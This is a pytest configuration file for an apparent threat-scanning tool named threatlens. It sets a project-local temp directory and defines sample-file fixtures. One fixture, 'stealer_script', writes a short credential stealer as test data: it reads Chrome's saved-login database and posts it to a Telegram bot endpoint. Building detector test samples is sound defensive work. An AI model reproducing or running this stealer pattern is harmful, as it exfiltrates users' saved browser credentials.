"""Pytest configuration and shared fixtures."""

import os
import pathlib
import sys
import tempfile
import pytest

# Ensure threatlens package is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# tests/test_full.py is an integration *script* (calls sys.exit at import time)
# rather than a pytest module. Excluding it keeps `pytest` from aborting the
# whole session during collection. Run it directly with `python tests/test_full.py`.
collect_ignore = ["test_full.py"]

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")

_REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
_PROJECT_BASETEMP = _REPO_ROOT / ".pytest-tmp"


def pytest_configure(config: pytest.Config) -> None:
    """Redirect pytest's tmp basetemp to a project-local directory.

    Why this exists: pytest's default basetemp is
    ``{system_temp}/pytest-of-{user}/`` and pytest's tmp_path_factory needs to
    *list* that directory (`os.scandir`) on every run to compute the next
    numbered subdir. On CI workers — and on developer machines where some
    earlier pytest run was killed mid-cleanup — that directory can end up
    owned by SYSTEM or in a denied-ACL state, and the user can no longer
    `os.scandir` it without admin rights.

    The symptom is `PermissionError [WinError 5]` raised at fixture setup
    time, *before* any test code executes — making it look like a test bug
    when it's actually environment rot. Pinning basetemp to a directory
    pytest itself created (under the repo, where the running user definitely
    has write/scan permission) sidesteps the problem entirely.

    pytest still keeps the last `tmp_path_retention_count` (default 3) runs
    inside `.pytest-tmp/`, so cleanup behaviour is unchanged.

    Honoured: `--basetemp <path>` on the command line still wins (we only set
    `option.basetemp` when the user didn't pass one).
    """
    if not config.getoption("--basetemp"):
        _PROJECT_BASETEMP.mkdir(parents=True, exist_ok=True)
        config.option.basetemp = str(_PROJECT_BASETEMP)


@pytest.fixture
def tmp_file():
    """Create a temporary file that auto-deletes."""
    paths = []

    def _create(content: bytes, suffix: str = ".bin"):
        p = tempfile.mktemp(suffix=suffix)
        with open(p, "wb") as f:
            f.write(content)
        paths.append(p)
        return p

    yield _create

    for p in paths:
        if os.path.exists(p):
            os.unlink(p)


@pytest.fixture
def stealer_script(tmp_file):
    """Create a test stealer script."""
    code = (
        "import os, base64, requests\n"
        "chrome = os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data')\n"
        "data = open(chrome, 'rb').read()\n"
        "requests.post('https://api.telegram.org/bot123/sendDocument', files={'f': data})\n"
    )
    return tmp_file(code.encode(), suffix=".py")


@pytest.fixture
def clean_script(tmp_file):
    """Create a clean Python script."""
    return tmp_file(b"def add(a, b): return a + b\nprint(add(2, 3))\n", suffix=".py")


@pytest.fixture
def fake_pe(tmp_file):
    """Create a fake PE file."""
    return tmp_file(b"MZ" + b"\x00" * 500, suffix=".exe")
